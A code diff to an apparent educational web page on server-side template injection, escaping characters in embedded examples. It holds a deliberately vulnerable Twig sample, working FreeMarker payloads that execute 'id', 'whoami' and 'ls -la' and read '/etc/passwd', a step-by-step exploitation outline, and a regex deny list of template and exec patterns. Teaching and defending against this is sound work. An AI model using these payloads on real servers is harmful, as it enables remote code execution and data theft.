@@ -169,8 +169,8 @@ def profile():
                   title="Vulnerable Twig Usage" 
                   code={`<?php
 // Vulnerable PHP application using Twig
-use Twig\Environment;
-use Twig\Loader\ArrayLoader;
+use Twig\\Environment;
+use Twig\\Loader\\ArrayLoader;
 
 $loader = new ArrayLoader([]);
 $twig = new Environment($loader);
@@ -249,32 +249,32 @@ return output.toString();`}
                   language="freemarker" 
                   title="FreeMarker SSTI Payloads" 
                   code={`<#-- Basic detection -->
-${7*7}  <#-- Should output 49 -->
+\${7*7}  <#-- Should output 49 -->
 
 <#-- Command execution -->
-<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
+<#assign ex="freemarker.template.utility.Execute"?new()> \${ ex("id") }
 
 <#-- File reading -->
 <#assign classloader=thread.currentThread().contextClassLoader>
 <#assign owc=classloader.loadClass("freemarker.template.utility.ObjectWrapper")>
 <#assign dwf=owc.getField("BEANS_WRAPPER").get(null)>
 <#assign ec=dwf.unwrap(classloader.loadClass("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null))>
-${ec.exec("cat /etc/passwd")}
+\${ec.exec("cat /etc/passwd")}
 
 <#-- Alternative command execution -->
-${"freemarker.template.utility.Execute"?new()("whoami")}
+\${"freemarker.template.utility.Execute"?new()("whoami")}
 
 <#-- Using ObjectConstructor -->
 <#assign oc="freemarker.template.utility.ObjectConstructor"?new()>
-${oc("java.lang.ProcessBuilder","id").start()}
+\${oc("java.lang.ProcessBuilder","id").start()}
 
 <#-- Reading system properties -->
 <#assign system="java.lang.System"?new()>
-${system.getProperty("user.name")}
+\${system.getProperty("user.name")}
 
 <#-- Memory access -->
 <#assign thread=thread.currentThread()>
-${thread.getThreadGroup()}
+\${thread.getThreadGroup()}
 
 <#-- Class loading and method invocation -->
 <#assign classloader=thread.currentThread().contextClassLoader>
@@ -282,7 +282,7 @@ ${thread.getThreadGroup()}
 <#assign process=rt.exec("ls -la")>
 <#assign scanner=classloader.loadClass("java.util.Scanner").getConstructor(classloader.loadClass("java.io.InputStream")).newInstance(process.getInputStream())>
 <#assign result=scanner.useDelimiter("\\A").next()>
-${result}`} 
+\${result}`} 
                 />
               </div>
             </TabsContent>
@@ -421,7 +421,7 @@ $content`}
             <h5 className="font-semibold mb-2">Step-by-Step Exploitation:</h5>
             <ol className="list-decimal pl-6 space-y-2">
               <li><strong>Identify Injection Points:</strong> Look for user input that gets reflected in responses</li>
-              <li><strong>Test for Template Processing:</strong> Use mathematical expressions like <code>{{`{7*7}`}}</code></li>
+              <li><strong>Test for Template Processing:</strong> Use mathematical expressions like double curly braces with 7*7</li>
               <li><strong>Determine Template Engine:</strong> Use engine-specific syntax to identify the backend</li>
               <li><strong>Explore Template Context:</strong> Discover available objects and functions</li>
               <li><strong>Escalate to Code Execution:</strong> Craft payloads for command execution</li>
@@ -454,13 +454,13 @@ def hello():
 def validate_template_input(user_input):
     # Reject dangerous characters and patterns
     dangerous_patterns = [
-        r'\{\{.*\}\}',  # Template expressions
-        r'\{%.*%\}',    # Template statements
+        r'\\{\\{.*\\}\\}',  # Template expressions
+        r'\\{%.*%\\}',    # Template statements
         r'__.*__',      # Python special methods
-        r'\..*\(',      # Method calls
-        r'import\s+',   # Import statements
-        r'exec\s*\(',   # Exec calls
-        r'eval\s*\(',   # Eval calls
+        r'\\..*\\(',      # Method calls
+        r'import\\s+',   # Import statements
+        r'exec\\s*\\(',   # Exec calls
+        r'eval\\s*\\(',   # Eval calls
     ]
     
     for pattern in dangerous_patterns:
